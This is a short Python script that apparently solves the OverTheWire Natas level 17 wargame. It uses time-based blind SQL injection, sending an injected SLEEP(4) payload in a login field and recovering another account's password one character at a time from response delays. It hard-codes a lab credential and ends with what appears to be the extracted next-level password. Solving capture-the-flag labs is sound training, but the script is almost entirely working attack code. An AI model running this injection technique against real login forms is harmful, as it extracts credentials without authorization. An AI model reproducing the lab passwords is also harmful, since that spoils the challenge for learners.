import requests
from string import *
from time import *

characters=lowercase+uppercase+digits

username="natas17"
password='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url='http://natas17.natas.labs.overthewire.org'

session=requests.Session()

passwordb=list('')

while True:
    for ch in characters :
        start_time=time()
        print "current password : ","".join(passwordb)+ch
        response=session.post(url,data={"username" : 'natas18" AND BINARY password LIKE "'+"".join(passwordb)+ch+'%" AND SLEEP(4) #'} ,auth=(username,password))
        end_time=time()
        content=response.text
        diff=end_time-start_time

        if diff >=1 :
            passwordb.append(ch)

print content


#xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
